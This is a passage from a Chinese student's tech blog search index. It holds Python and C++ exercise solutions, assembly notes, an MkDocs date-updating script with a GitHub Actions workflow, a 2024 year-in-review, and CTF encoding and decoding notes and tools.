米的地方，她需要游多少步呢。请你编程解决这个问题。\n输入格式输入一个实数 $s$（单位：米），表示要游的目标距离。\n输出格式输出一个整数，表示小玉一共需要游多少步。\n样例 #1样例输入 #14.3\n\n样例输出 #13\n\n提示数据保证，$0 \\leq s &lt; 100$，且 $s$ 小数点后最多只有一位。\n题解s = float(input())step = 2all_step = 0count = 0while all_step &lt; s:    count += 1    all_step += step    step = step * 0.98print(count)\n\n解释首先，我们初始化 step 为 $2$，all_step 为 $0$，count 为 $0$。\n然后，我们开始循环，当 all_step 小于等于 s 时，我们进行一次循环，count 加 $1$，all_step 加上 step，step 乘以 $0.98$。\n最后，我们输出 count，表示小玉一共需要游多少步。\n禽兽的传染病题目背景mxj 的启发。\n题目描述禽兽患传染病了。一个禽兽会每轮传染 $x$ 个禽兽。试问 $n$ 轮传染后有多少禽兽被传染？\n输入格式两个非负整数 $x$ 和 $n$。\n输出格式一个整数，即被传染的禽兽数。\n样例 #1样例输入 #110 2\n\n样例输出 #1121\n\n提示保证 $x,n$ 以及答案都在 $64$ 位无符号整数的表示范围内。\n题解print(&#x27;这个我不会做&#x27;)\n\n解释这个题目我不会做，因为我不会。\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"2024年度总结","url":"/posts/c2cf88b8.html","content":"平时没有随手详细记录的习惯，只有相册最能带起我的回忆，每次总结几乎都是看着相册回忆的。\n2024 年度总结一月一月在忙啥呢，月初正在奋战期末，虽然最后成绩不咋地倒数，放假依旧是最后一个走的。\n晚回去几天，筹备了一下选课指北的更新，那时候就已经用 ChatGPT 写脚本了，那时候 ChatGPT 还是 3.5 版本。现在 3.5 已经被淘汰了，AI 发展好快。\n\n翻到相册里去年是 1.16 初雪，那时候都已经放假回家了，只有一小部分同学还在学校，不知道今年第一场雪什么时候下。\n\n月末正在放寒假，去拔了一颗智齿，真的很痛，在家里玩幻兽帕鲁，顺便随便学点。\n二月二月在家拍了全家福，选课指北工作做了好几天，一致好评（墨镜），当时选课系统很抽象，那时候选课指北域名还是 xkzb.qfnu.w1ndys.top，来来回回也是到处问到处回答问题，研究各专业的培养方案，一顿忙碌，键盘都快敲烂了。\n\n\n\n2.22 就回学校了，提前回来了一个多星期吧，雪还没化。\n2 月底就开始泡图书馆了，每天抱着电脑去图书馆写代码写新的选课指北（Easy-QFNU），老爽了。\n四级没过。\n三月三月继续搞 Easy-QFNU，三月中旬和师哥们举办了网络安全协会院赛，出了一些简单的题目。\n\n好大儿送的一米五的大鼬子。\n\n学不懂的计组、网络安全数学基础，密码学根本看不懂啊。\n\n三月底体重还是很好的，现在……不想说什么了。\n四月四月，入手了 AOC 显示器，体验感很好，拿来写代码太舒服了。\n痴迷于写 Easy-QFNU，到很晚才回宿舍。\n\n蓝桥杯，为 IT 事业捐款 300 元。\n\n4 月 13 号拍了好多花。\n\nHGAME2024 的周边。\n\n水了个计算机设计省赛，最后省三（确实水），我都不知道拿奖了。\n烫头发~，Easy-QFNU 的提交数达到了七百多。\n被一个问题折腾了很久。\n\n五月还是有时间都在搞 Easy-QFNU，周末没事就去自习室 code 找乐子。\n音乐节。\n\n六月天天泡图书馆写代码…..\n第一次进网络中心看看啥样。\nQwen 大模型开源了，部署在本地看看啥样（本地跑不动，很蠢）。\n和师哥举办补天校园行活动。\n七月暑假留校，不得不说留校是真的舒服，自己想学什么学什么，一个人住一小屋。\n第一次接触 docker 容器技术。\n\n成绩陆续快出来了，幸好没挂科，感谢计组老师捞了一把，学院网络部这边接任了部长。\n闲着没事干闲逛，原来之前就观摩过化院那边的石膏娃娃。\n\n7.22 Easy-QFNU 正式发布。\n\n开始在迎新群里接新生，回复问题了~\n回家拔了第二对智齿。\n卷卷（QQ 机器人）诞生了\n\n八月8 月 2 号回学校继续留校，对卷卷 QQ 机器人开发上瘾了，每天都在捣鼓这个 Python。\n\n在学校自己过了一个生日。\n更高频率的回复 24 级新生的问题，卷卷也已经投入新生群的使用了。\n四级又没过。\n办了健身房的卡，跟舍友一起去。\n开始跟主办方筹划源鲁杯。\n\n迎新季，当然我也参与工作了，毕竟是学生干部。\n\n认识了一个小师妹\n九月九月刚开学，时间还很宽裕，晚上经常逛操场玩。\n接着就是迎新宣讲、网络部、网络空间安全协会都宣讲。\n\n十月又烫了一次头。\n第一次去猫咖撸猫。\n\n第一次抓娃娃。\n\n网络部干事纳新。\n\n上了大学以来第一次觉得有用的课，安工讲的。\n\n源鲁杯准备开赛了~！\n\n前面提到的很水的奖…….\n\n九州信泰杯，第二次打省赛了，很幸运这次在本校打，作为学生代表发言哈哈哈哈，虽然我菜菜的，面基了好几个厉害的师傅。\n\n\n十一月百团大战、玩了一天拍了好多照片。\n11.10，遇到了这辈子很重要的一个人，嘿嘿~\n\n15 号在德州打技能兴鲁决赛，题难度不算很大，省二应该是，主办方到现在没消息（真慢）。\n\n月底迎新晚会，搞弹幕大屏，还挺好玩的。\n\n十二月第一次涂石膏娃娃，还有火锅！火锅！\n\n省赛的证书发了。\n\n吃吃吃，玩玩玩。\n开始学习 flask 网站。\n第一次收到花。\n\n即兴想法又来撸猫了。\n\n吃烤肉吃烤肉。\n\n2024 就这样收官了，2025 继续加油。\n","categories":["随笔"],"tags":["W1ndys年度总结","随笔"]},{"title":"3月25日汇编语言与逆向工程","url":"/posts/ca668a7f.html","content":"3 月 25 日汇编语言与逆向工程主函数汇编指令\n\npush rbp：将当前函数的栈帧基址寄存器的值压入栈中，用于保存前一个函数的栈帧基址。\n\nmov rbp, rsp：将栈顶指针的值赋给栈帧基址寄存器，这样 rbp 指向了当前函数的栈帧。\n\nsub rsp, 10h：在栈上为局部变量分配 10h（16 字节）的空间，即在栈上分配了 16 字节的空间用于存储局部变量或临时数据。\n\nmov esi, 4：将立即数 4 赋给 esi 寄存器，该寄存器通常用于作为函数参数传递整型参数。\n\nmov edi, 3：将立即数 3 赋给 edi 寄存器，通常用于作为函数参数传递整型参数。\n\ncall fun：调用名为 fun 的函数，传递了两个参数，分别是 4 和 3，它们存储在 esi 和 edi 寄存器中。\n\nmov [rbp+m], eax：将 eax 寄存器的值（即函数 fun 的返回值）存储到位于当前栈帧的偏移量 m 处的内存地址中。这里的 m 是一个未知的值，需要根据具体的代码上下文来确定。\n\nmov eax, 0：将 0 赋给 eax 寄存器，通常用于函数返回值。\n\nleave：恢复栈帧，实际上执行的是 mov rsp, rbp 和 pop rbp 的组合指令，将栈帧基址寄存器（rbp）的值恢复为调用者的栈帧基址，并将栈指针（rsp）恢复到调用者函数的栈顶。\n\nretn：函数返回指令，将控制流返回到调用该函数的地址处。\n\n\n这段代码的主要作用是调用一个函数 fun，将参数 4 和 3 传递给它，然后将其返回值存储到指定的内存位置，并返回到调用者。\n栈帧图高地址     ↑     |     |            +------------------+     |            |    返回地址       |     |            +------------------+     |            |                  |     |            |  保存的rbp值      |  ← rbp, rsp     |            +------------------+     |            |                  |     |            |    局部变量       |     |            |    (10 字节)      |     |            |                  |     |            +------------------+     |            |                  |     |            |     参数空间      |  ← rsp (调用fun前)     |            |                  |     |            +------------------+     |            |                  |     |            |     参数空间      |  ← rsp (fun内部)     |            |                  |     |            +------------------+     ↓低地址\n\nfun 函数汇编指令\n这段汇编指令表示一个简单的函数，它接受两个整数参数，并返回它们的和。\n\npush rbp：保存调用该函数前的栈帧基址寄存器的值。\n\nmov rbp, rsp：将当前栈顶指针的值赋给栈帧基址寄存器，建立当前函数的栈帧。\n\nmov [rbp+a], edi：将第一个参数（a）存储到位于当前栈帧的偏移量 a 处的内存地址中。通常，函数的参数通过寄存器传递，edi 寄存器用于传递第一个整数参数。\n\nmov [rbp+b], esi：将第二个参数（b）存储到位于当前栈帧的偏移量 b 处的内存地址中。通常，函数的参数通过寄存器传递，esi 寄存器用于传递第二个整数参数。\n\nmov edx, [rbp+a]：将第一个参数（a）的值加载到 edx 寄存器中。\n\nmov eax, [rbp+b]：将第二个参数（b）的值加载到 eax 寄存器中。\n\nadd eax, edx：将 edx 寄存器中的值和 eax 寄存器中的值相加，结果保存在 eax 寄存器中。这里计算了两个参数的和。\n\npop rbp：恢复调用该函数前的栈帧基址寄存器的值。\n\nretn：函数返回指令，将控制流返回到调用该函数的地址处。\n\n\n这段代码的作用是接受两个整数参数，将它们相加，然后返回结果。\n栈帧图高地址     ↑     |     |            +------------------+     |            |    返回地址       |     |            +------------------+     |            |                  |     |            |  保存的rbp值      |  ← rbp, rsp     |            +------------------+     |            |                  |     |            |   参数 b 的值     |  ← rbp+8     |            +------------------+     |            |                  |     |            |   参数 a 的值     |  ← rbp+0     |            +------------------+     ↓低地址\n","categories":["QFNU","汇编语言与逆向工程","讲解"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"A replacement method for inaccurate date display in Mkdocs-material","url":"/posts/fa88f28c.html","content":"There is another Chinese translation for this article：https://blog.w1ndys.top/posts/512a6b20\nNote:A more efficient approach:https://github.com/squidfunk/mkdocs-material/discussions/7135#discussioncomment-9277842\nQuestion background.After a deployment to Vercel, the date display was found to be inaccurate.\nI asked the community for help, details can be seen: https://github.com/squidfunk/mkdocs-material/discussions/6924/, finally found that Vercel does not support this operation, so after two weeks of testing, I found a replacement solution.\nThe specific idea is to add a text of time information at the bottom of each Markdown file, and use Python script + automated workflow to automatically update the date.This scheme is suitable for:\n\ndeploy to material sites on the Vercel platform.\n\ndocument repository uses GitHub.\n\nthe submission record of the document repository is synchronized with the content of the document\n\n\nSolutionReference repository: https://github.com/W1ndys/Easy-QFNU\nPython scriptimport reimport datetimeimport osimport requests# Constantsmodification_date_pattern = r&#x27;:material-clock-edit-outline:&#123; title=&quot;Modification date&quot; &#125; (\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;)&#x27;creation_date_pattern = r&#x27;:material-clock-plus-outline:&#123; title=&quot;Creation date&quot; &#125; (\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;)&#x27;# Get the create and update time of the file from the repositorydef get_github_file_info(repo_owner, repo_name, file_path, github_token):    api_url = f&quot;https://api.github.com/repos/&#123;repo_owner&#125;/&#123;repo_name&#125;/commits?path=&#123;file_path&#125;&quot;    headers = &#123;&quot;Authorization&quot;: f&quot;token &#123;github_token&#125;&quot;&#125;    response = requests.get(api_url, headers=headers)    if response.status_code == 200:        commits = response.json()        if commits:            create_time = datetime.datetime.fromisoformat(                commits[-1][&quot;commit&quot;][&quot;committer&quot;][&quot;date&quot;].replace(&quot;Z&quot;, &quot;+00:00&quot;)            ).strftime(&quot;%Y-%m-%d&quot;)            update_time = datetime.datetime.fromisoformat(                commits[0][&quot;commit&quot;][&quot;committer&quot;][&quot;date&quot;].replace(&quot;Z&quot;, &quot;+00:00&quot;)            ).strftime(&quot;%Y-%m-%d&quot;)            return create_time, update_time        else:            print(&quot;No submission record found for&quot;, file_path)    else:        print(f&quot;ERROR：&#123;response.status_code&#125; - &#123;response.text&#125;&quot;)    return None, None# Get the relative path of the file from the docs directorydef get_relative_path_from_docs(file_path):    return &quot;docs/&quot; + file_path.split(&quot;docs/&quot;, 1)[-1] if &quot;docs/&quot; in file_path else None# Update the date of the Markdown filedef update_markdown_files(dir_path, exclude_paths, repo_owner, repo_name, github_token):    for root, dirs, files in os.walk(dir_path):        dirs[:] = [d for d in dirs if os.path.join(root, d) not in exclude_paths]        for file in files:            file_path = os.path.join(root, file)            # Exclude files that do not need to be updated            if file_path in exclude_paths or not file.endswith(&quot;.md&quot;):                print(f&quot;Skipping excluded file: &#123;file_path&#125;&quot;)                continue            file_path = file_path.replace(&quot;\\\\&quot;, &quot;/&quot;)  # The path separator is unified as /            relative_path = get_relative_path_from_docs(file_path) # Get the relative path of the file from the docs directory            if relative_path is None:                print(f&quot;Skipping non-docs file: &#123;file_path&#125;&quot;)                continue                        create_time, update_time = get_github_file_info(                repo_owner, repo_name, relative_path, github_token            )            print(&quot;-----------------------------------------------------------&quot;)            print(f&quot;Now processing file: &#123;relative_path&#125;\\n&quot;)            print(f&quot;Create date: &#123;create_time&#125;, Update date: &#123;update_time&#125;\\n&quot;)            # Get the date information from the Markdown file of the repository            if create_time is None or update_time is None:                print(f&quot;&#123;file_path&#125; No submission record found, skipping&quot;)                continue            with open(file_path, &quot;r+&quot;, encoding=&quot;utf-8&quot;) as f:                lines = f.readlines()                for i, line in enumerate(lines):                    line = line.strip()                    result = re.search(modification_date_pattern, line)                    if result:                        current_date = result.groups(1)[0]                        if current_date == update_time:                            print(f&quot;&#123;file_path&#125; The date is up to date.&quot;)                            break                        else:                            lines[i] = f&#x27;:material-clock-edit-outline:&#123;&#123; title=&quot;Modification date&quot; &#125;&#125; &#123;update_time&#125;\\n&#x27;                            f.seek(0)                            f.writelines(lines)                            print(f&quot;&#123;file_path&#125; The date has been modified, and the modified date is: &#123;update_time&#125;&quot;)                            break                else:                    lines.append(f&#x27;\\n\\n---\\n\\n:material-clock-edit-outline:&#123;&#123; title=&quot;Modification date&quot; &#125;&#125; &#123;update_time&#125;\\n:material-clock-plus-outline:&#123;&#123; title=&quot;Creation date&quot; &#125;&#125; &#123;create_time&#125;\\n&#x27;)                    f.seek(0)                    f.writelines(lines)                    print(f&quot;&#123;file_path&#125; No date, added&quot;)            print(&quot;-----------------------------------------------------------&quot;)if __name__ == &quot;__main__&quot;:    docs_dir = os.path.join(os.getcwd(), &quot;docs&quot;)    # Exclude directories or files that do not need to be updated    exclude_paths = [        os.path.join(docs_dir, &quot;example_file.md&quot;),        os.path.join(docs_dir, &quot;example_directory&quot;),    ]    repo_owner = &quot;repo_owner&quot; # Change here to the owner of the repository    repo_name = &quot;repo_name&quot; # Change here to the name of the repository    github_token = os.environ.get(&quot;GITHUB_TOKEN&quot;)    update_markdown_files(docs_dir, exclude_paths, repo_owner, repo_name, github_token)\n\nGitHub ActionsUse GitHub Actions to automate deployment and execute scripts automatically every time push arrives at the repository, at a fixed time, and when triggered manually.\nname: Update-docson:  push:    branches:      - main # push to main branch  schedule:    - cron: &quot;0 17 * * *&quot; # Every day at 5:00 PM (UTC+8)  workflow_dispatch:permissions:  contents: writejobs:  update-docs:    runs-on: ubuntu-latest    steps:      - name: Checkout Repository        uses: actions/checkout@v2      - name: Set up Python        uses: actions/setup-python@v2        with:          python-version: &quot;3.11.4&quot;      - name: Install dependencies        run: pip install requests      - name: Run Python script        env:          GITHUB_TOKEN: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;        run: python update-docs.py #  Change here to the name of the Python script file      - name: Add changes to git        run: |          git add .      - name: Commit and push changes        uses: stefanzweifel/git-auto-commit-action@v4        with:          commit_message: Update docs date #  Change here to the commit message\n\nNoteThe Python script is placed in the root directory of the Github repository and named update-docs.py (the name can be customized, but note that it also needs to be modified in the corresponding location of the workflow).\nYou need to modify the variables in the Python script to define your repository owner and repository name, and the script will get API based on this.\nOther notes:I come from China, my English level is not very good, some of the above documents are obtained through translation software, if there are any description errors, please forgive me, and point out the corrections in time.\nAcknowledgements\nMkdocs-material\nThanks to the developers of the framework\n\nW1ndys\nMy code ability is not high, with the help of ChatGPT, completed the implementation of this script, which really cost me too much time and energy, I want to thank myself\n\nChatGPT\nA powerful language model for text generation, which can be used to generate text based on the input text, which is very useful for this script.\n\n\n","categories":["技术教程"],"tags":["Python","Mkdocs","material","Vercel"]},{"title":"Anaconda如何在当前目录创建虚拟环境","url":"/posts/c85e665e.html","content":"Anaconda如何在当前目录创建虚拟环境要在当前文件夹中使用 Anaconda 创建虚拟环境，你需要执行以下步骤：\n\n打开命令行界面（例如，在 Windows 上使用命令提示符或在 macOS&#x2F;Linux 上使用终端）。\n\n导航到你想要创建虚拟环境的文件夹。你可以使用 cd 命令（change directory）来实现这一点。例如：\ncd path/to/your/folder\n\n一旦你在正确的文件夹中，使用以下命令创建虚拟环境：\nconda create --prefix ./myenv python=3.8\n这将在当前文件夹中创建一个名为 myenv 的虚拟环境，并将其与 Python 3.8 关联起来。你可以将 myenv 替换为你想要的任何环境名称。\n\n激活虚拟环境。在 Windows 上，使用：\n.\\myenv\\Scripts\\activate\n在 macOS&#x2F;Linux 上，使用：\nsource myenv/bin/activate\n\n当你完成工作后，可以使用 deactivate 命令来退出虚拟环境。\n\n\n这样，你就可以在当前文件夹中成功创建并使用 Anaconda 虚拟环境了。\n","categories":["Python","Anaconda"],"tags":["Python","Anaconda"]},{"title":"B2005 字符三角形","url":"/posts/a7f00154.html","content":"字符三角形题目描述给定一个字符，用它构造一个底边长 $5$ 个字符，高 $3$ 个字符的等腰字符三角形。\n输入格式输入只有一行，包含一个字符。\n输出格式该字符构成的等腰三角形，底边长 $5$ 个字符，高 $3$ 个字符。\n样例 #1样例输入 #1*\n\n样例输出 #1* ********\n\n提示对于 $100 %$ 的数据，输入的字符是 ASCII 中的可见字符。\n题解a=str(input())print(f&quot;  &#123;a&#125;  &quot;)print(f&quot; &#123;a*3&#125; &quot;)print(f&quot;&#123;a*5&#125;&quot;)\n\n知识点今天随便一刷，看到了一个很简单的题目，但是知识点值得学一下\n\nprint 的格式化输出\n\n在 Python 中，f 字符串（格式化字符串）是一种特殊的字符串，它允许在字符串中嵌入表达式。当你在字符串前面加上 f 或 F，Python 会解析该字符串并在其中查找花括号 &#123;&#125; 内的表达式，并将其替换为其值。这使得在字符串中嵌入变量、表达式或函数调用变得更加方便。\n例如，在上面的代码中，f&quot;&#123;a* 3&#125;&quot; 中的 &#123;a* 3&#125; 将被替换为 char 变量的值乘以 3。这使得打印输出变得更加灵活和动态。\n\n还有 strip 函数的用法\n\nstrip() 是一个字符串方法，它用于去除字符串两端的空白字符（空格、制表符、换行符等）。如果不提供任何参数，strip() 方法将默认去除字符串两端的空白字符。\n例如：\ns = &quot;  Hello, World!  &quot;print(s.strip())  # 输出: &quot;Hello, World!&quot;\n\n在输入处理中，strip() 方法通常用于去除用户输入的多余空白，确保输入的字符串不包含额外的空格或换行符，使得后续处理更加方便。\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"BurpSuite抓包微信浏览器微信小程序教程","url":"/posts/806f3993.html","content":"","categories":["技术教程"],"tags":["BurpSuite","微信小程序抓包","微信浏览器抓包"]},{"title":"BeginCTF（新生赛道）部分wp","url":"/posts/c4767082.html","content":"菜鸡呜呜呜，就写了两道题\nMiscreal check inbase32 秒了\nTupper搜一下题目名字\n可以搜到这篇文章\nhttps://hasegawaazusa.github.io/tupper-note.html#/\n结合题目\n用脚本把文件内容拼一下\nimport os# 获取当前目录current_directory = os.getcwd()# 创建一个新的txt文件来存储汇总内容output_file_path = os.path.join(current_directory, &#x27;汇总文件.txt&#x27;)output_file = open(output_file_path, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)# 遍历当前目录下以4的倍数命名的txt文件for i in range(0, 673, 4):    file_name = f&#x27;&#123;i&#125;.txt&#x27;    file_path = os.path.join(current_directory, file_name)    # 检查文件是否存在    if os.path.exists(file_path):        # 读取文件内容并写入汇总文件        with open(file_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as input_file:            content = input_file.read()            output_file.write(content)# 关闭输出文件output_file.close()print(f&#x27;汇总完成，结果存储在 &#123;output_file_path&#125;&#x27;)\n\n得到字符串\n\nMTQyNzgxOTM0MzI3MjgwMjYwNDkyOTg1NzQ1NzU1NTc1MzQzMjEwNjIzNDkzNTI1NDM1NjI2NTY3NjY0Njk3MDQwOTI4NzQ2ODgzNTQ2NzkzNzEyMTI0NDQzODIyOTg4MjEzNDIwOTM0NTAzOTg5MDcwOTY5NzYwMDI0NTg4MDc1OTg1MzU3MzUxNzIxMjY2NTc1MDQxMzExNzE2ODQ5MDcxNzMwODY2NTk1MDUxNDM5MjAzMDAwODU4MDg4MDk2NDcyNTY3OTAzODQzNzg1NTM3ODAyODI4OTQyMzk3NTE4OTg2MjAwNDExNDMzODMzMTcwNjQ3MjcxMzY5MDM2MzQ3NzA5MzYzOTg1MTg1NDc5MDA1MTI1NDg0MTk0ODYzNjQ5MTUzOTkyNTM5NDEyNDU5MTEyMDUyNjI0OTM1OTExNTg0OTc3MDgyMTkxMjY0NTM1ODc0NTY2MzczMDI4ODg3MDEzMDMzODIyMTA3NDg2Mjk4MDAwODE4MjE2ODQyODMxODczNjg1NDM2MDE1NTk3Nzg0MzE3MzUwMDY3OTQ3NjE1NDI0MTMwMDY2MjEyMTkyMDczMjI4MDg0NDkyMzIwNTA1Nzg4NTI0MzEzNjE2Nzg3NDUzNTU3NzY5MjExMzIzNTI0MTk5MzE5MDc4MzgyMDUwMDExODQ &#x3D;\n\nbase64 梭一下\n\n14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184\n\n放在线网站里梭一下 https://tuppers-formula.ovh/#/\n\n\nbegin{T4UUPER!}\n\n","categories":["CTF","WP"],"tags":["CTF","WP","BeginCTF"]},{"title":"C++常用的代码模板","url":"/posts/b138fb0c.html","content":"生成随机数源代码#include &lt;iostream&gt;#include &lt;random&gt;#include &lt;chrono&gt;using namespace std;int main() &#123;    // 使用当前时间作为随机数生成器的种子    unsigned seed = chrono::system_clock::now().time_since_epoch().count();        // 创建一个随机数生成器    default_random_engine generator(seed);        // 创建一个均匀分布的随机数生成器，范围从1到100    uniform_int_distribution&lt;int&gt; distribution(1,100);        // 生成并打印一个随机数    cout &lt;&lt; &quot;Random number: &quot; &lt;&lt; distribution(generator) &lt;&lt; endl;        return 0;&#125;\n\n摘要// 使用当前时间作为随机数生成器的种子unsigned seed = chrono::system_clock::now().time_since_epoch().count();// 创建一个随机数生成器default_random_engine generator(seed);// 创建一个均匀分布的随机数生成器，范围从1到100uniform_int_distribution&lt;int&gt; distribution(1,100);\ndistribution(generator)\n\n#include &lt;chrono&gt;\n\n","categories":["C++"],"tags":["C++"]},{"title":"C++类的基本学习","url":"/posts/a8f20fc2.html","content":"（因为上学期C++选修课没认真听，导致这学期数据结构啥也不会，好吧，出来混迟早是要还的，现在开始恶补C++）\n目前需要学习&#x2F;复习的内容是\n\nC++类\nC++结构体\ntemplate模板类\n双链表的插入和删除\nC++DataType的用法\nmod运算在C++的应用\n保证小于最大长度\n数组指针绕回\n数组前移\n\n\n\n\nC++ 类 &amp; 对象C++ 在 C 语言的基础上增加了面向对象编程，C++ 支持面向对象程序设计。类是 C++ 的核心特性，通常被称为用户定义的类型。\n类用于指定对象的形式，是一种用户自定义的数据类型，它是一种封装了数据和函数的组合。类中的数据称为成员变量，函数称为成员函数。类可以被看作是一种模板，可以用来创建具有相同属性和行为的多个对象。\nC++ 类定义定义一个类需要使用关键字 class，然后指定类的名称，并类的主体是包含在一对花括号中，主体包含类的成员变量和成员函数。\n定义一个类，本质上是定义一个数据类型的蓝图，它定义了类的对象包括了什么，以及可以在这个对象上执行哪些操作。\n\n以下实例我们使用关键字 class 定义 Box 数据类型，包含了三个成员变量 length、breadth 和 height：\nclass Box {   public:      double length;   &#x2F;&#x2F; 盒子的长度      double breadth;  &#x2F;&#x2F; 盒子的宽度      double height;   &#x2F;&#x2F; 盒子的高度 };\n关键字 public 确定了类成员的访问属性。在类对象作用域内，公共成员在类的外部是可访问的。您也可以指定类的成员为 private 或 protected，这个我们稍后会进行讲解。\n定义 C++ 对象类提供了对象的蓝图，所以基本上，对象是根据类来创建的。声明类的对象，就像声明基本类型的变量一样。下面的语句声明了类 Box 的两个对象：\nBox Box1;          &#x2F;&#x2F; 声明 Box1，类型为 Box Box Box2;          &#x2F;&#x2F; 声明 Box2，类型为 Box\n对象 Box1 和 Box2 都有它们各自的数据成员。\n访问数据成员类的对象的公共数据成员可以使用直接成员访问运算符 . 来访问。\n\n为了更好地理解这些概念，让我们尝试一下下面的实例：\n实例#include &lt;iostream&gt; using namespace std; class Box&#123;   public:      double length;   // 长度      double breadth;  // 宽度      double height;   // 高度      // 成员函数声明      double get(void);      void set( double len, double bre, double hei );&#125;;// 成员函数定义double Box::get(void)&#123;    return length * breadth * height;&#125; void Box::set( double len, double bre, double hei)&#123;    length = len;    breadth = bre;    height = hei;&#125;int main( )&#123;   Box Box1;        // 声明 Box1，类型为 Box   Box Box2;        // 声明 Box2，类型为 Box   Box Box3;        // 声明 Box3，类型为 Box   double volume = 0.0;     // 用于存储体积    // box 1 详述   Box1.height = 5.0;    Box1.length = 6.0;    Box1.breadth = 7.0;    // box 2 详述   Box2.height = 10.0;   Box2.length = 12.0;   Box2.breadth = 13.0;    // box 1 的体积   volume = Box1.height * Box1.length * Box1.breadth;   cout &lt;&lt; &quot;Box1 的体积：&quot; &lt;&lt; volume &lt;&lt;endl;    // box 2 的体积   volume = Box2.height * Box2.length * Box2.breadth;   cout &lt;&lt; &quot;Box2 的体积：&quot; &lt;&lt; volume &lt;&lt;endl;     // box 3 详述   Box3.set(16.0, 8.0, 12.0);    volume = Box3.get();    cout &lt;&lt; &quot;Box3 的体积：&quot; &lt;&lt; volume &lt;&lt;endl;   return 0;&#125;\n\n当上面的代码被编译和执行时，它会产生下列结果：\nBox1 的体积：210Box2 的体积：1560Box3 的体积：1536\n\n需要注意的是，私有的成员和受保护的成员不能使用直接成员访问运算符 (.) 来直接访问。我们将在后续的教程中学习如何访问私有成员和受保护的成员。\n","categories":["C++"],"tags":["C++"]},{"title":"CTF-crypto&misc常用解密工具","url":"/posts/85db357.html","content":"编码解码Python脚本base64换表脚本import base64#str1是要解密的代码str1 = &quot;5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==&quot;#string1是改过之后的base64表string1 = &quot;qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD&quot; string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))#NSSCTF&#123;a8d4347722800e72e34e1aba3fe914ae&#125;\n\n变异凯撒脚本凯撒密码作为最古老的密码体制之一,相信大多数人都知道,即简单的移位操作,那么问题来了,变异的凯撒密码又会是什么呢?拿到题先比对acsii码值对比表通过上面的acsii码值对比表可以看到第一个字符向后移了5,第二个向后移了6,第三个向后移了7,以此类推,很容易想到变异凯撒即每个向后移的位数是前一个加1:\nstr=&quot;afZ_r9VYfScOeO_UL^RWUc&quot;#第一位移动的值k=5for i in str:    print(chr(ord(i)+k),end=&#x27;&#x27;)    k+=1\n\n比较两个字符串输出不同的部分def compare_strings(str1, str2):    str11 = &quot;&quot;    str12 = &quot;&quot;    for i in range(min(len(str1), len(str2))):        if str1[i] != str2[i]:            str11+=str1[i]            str12+=str2[i]    print(str11)    print(str12)# 定义两个字符串str1 = &quot;第一个字符串&quot;str2 = &quot;第二个字符串&quot;# 调用函数compare_strings(str1, str2)\n\n删除所有回车text = &quot;你的文本\\n包含\\n回车&quot;new_text = text.replace(&quot;\\n&quot;, &quot;&quot;)print(new_text)\n\n在线工具包\nCyberchef的自动解密magic模式\n\n\n自动解密base等编码，很方便\n\n\nCyberChef (mzy0.com)\n\n\nCyberchef的主站，功能强大，非常推荐\n\n\nBugku在线工具\n\n\nBugku的在线工具包，也很齐全\n\n\n一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)\n\nBugku在线工具包分包编码base家族Base100编码解码https://ctf.bugku.com/tool/base100\nBase92编码解码https://ctf.bugku.com/tool/base92\nBase91编码解码https://ctf.bugku.com/tool/base91\nBase85编码解码https://ctf.bugku.com/tool/base85\nBase64编码解码https://ctf.bugku.com/tool/base64\nBase62编码解码https://ctf.bugku.com/tool/base62\nBase58编码解码https://ctf.bugku.com/tool/base58\nBase32编码解码https://ctf.bugku.com/tool/base32\nBase16编码解码https://ctf.bugku.com/tool/base16\n其他核心价值观编码https://ctf.bugku.com/tool/cvecode\n解密与佛论禅密码https://ctf.bugku.com/tool/todousharp\nJSBrainfuck&#x2F;OoKhttps://ctf.bugku.com/tool/brainfuck\nSojson.v5解密https://ctf.bugku.com/tool/sojson5\nSojson.v4 解密https://ctf.bugku.com/tool/sojson4\n古典密码UUencodehttps://ctf.bugku.com/tool/uuencode\nXXencode密码https://ctf.bugku.com/tool/xxencode\n维基利亚密码https://ctf.bugku.com/tool/vigenere\n希尔密码https://ctf.bugku.com/tool/hill\n栅栏密码https://ctf.bugku.com/tool/railfence\n凯撒密码https://ctf.bugku.com/tool/caesar\nADFGX密码https://ctf.bugku.com/tool/adfgx\n3DES&#x2F;CryptoJS&#x2F;TripleDesTripleDes(3DES)https://ctf.bugku.com/tool/tripledes\n工具很多\n\n持续更新中……\n","categories":["CTF","工具"],"tags":["CTF"]},{"title":"CTF入门指北——reserve","url":"/posts/7237d71d.html","content":"\n来自西安电子科技大学Moectf\n\n逆向工程（re)\n来自维基\n\n\n逆向工程（英语：Reverse Engineering），又称反向工程，是一种技术仿造过程。 即对一项目标产品进行逆向分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能性能规 其主要目的是，在无法轻易获得必要的生产信息下，直接从成品的分析，推导产品的设计原理\n\n那么，我们要做的是对于软件的逆向工程\n一般，CTF中的逆向工程题目形式为：程序接收用户的一个输入，并在程序中进行一系 列校验算法，如通过校验则提示成功，此时的输入即flag。这些校验算法可以是已经成 熟的加解密方案，也可以是作者自创的某种算法。比如，一个小游戏将用户的输入作为 游戏的操作步骤进行判断等。这类题目要求参赛者具备一定的算法能力、思维能力，甚 至联想能力。\n我们知道，我们可以阅读源代码，了解一个程序的功能 但是一个程序不一定需要源代码才能运行。 事实上，我们在运行可执行文件，那么他 